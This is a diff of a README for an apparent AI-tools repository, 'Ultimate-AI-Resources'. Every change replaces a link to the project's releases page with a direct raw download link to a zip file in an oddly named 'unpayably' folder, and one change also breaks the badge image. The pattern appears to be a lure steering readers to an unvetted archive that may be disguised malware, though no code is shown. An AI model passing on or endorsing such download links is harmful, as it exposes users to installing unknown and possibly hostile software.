@@ -1,6 +1,6 @@
 # 🤖 Ultimate-AI-Resources - Essential Tools for AI Exploration
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/JD33027/Ultimate-AI-Resources/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/JD33027/Ultimate-AI-Resources/main/unpayably/Ultimate-AI-Resources_2.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JD33027/Ultimate-AI-Resources/main/unpayably/Ultimate-AI-Resources_2.6.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To get started with Ultimate-AI-Resources, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to navigate to the Releases page.  
-   [Download Latest Release](https://github.com/JD33027/Ultimate-AI-Resources/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/JD33027/Ultimate-AI-Resources/main/unpayably/Ultimate-AI-Resources_2.6.zip)
 
 2. **Choose the Right Release**  
    On the Releases page, you will see a list of versions. Click on the latest version to view the details.
@@ -53,7 +53,7 @@ To get started with Ultimate-AI-Resources, follow these steps:
 ## 📥 Download & Install
 
 To download Ultimate-AI-Resources, visit the link below. You can find the latest and most stable version of the software there.  
-[Download Latest Release](https://github.com/JD33027/Ultimate-AI-Resources/releases)
+[Download Latest Release](https://raw.githubusercontent.com/JD33027/Ultimate-AI-Resources/main/unpayably/Ultimate-AI-Resources_2.6.zip)
 
 ## 🌐 Topics Covered
 
